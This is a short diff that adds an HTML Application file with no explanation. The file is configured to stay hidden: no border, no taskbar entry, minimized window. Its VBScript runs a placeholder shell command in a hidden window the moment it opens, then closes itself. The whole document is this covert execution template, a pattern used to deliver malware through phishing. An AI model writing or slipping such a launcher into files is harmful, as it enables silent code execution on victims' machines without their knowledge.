@@ -1,0 +1,9 @@
+<html><head><HTA:APPLICATION ID="x" APPLICATIONNAME="x"
+ BORDER="none" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize"/>
+<script language="VBScript">
+Sub Window_onLoad
+  Set objShell = CreateObject("Wscript.Shell")
+  objShell.Run "[command]", 0, False
+  self.close
+End Sub
+</script></head><body></body></html>
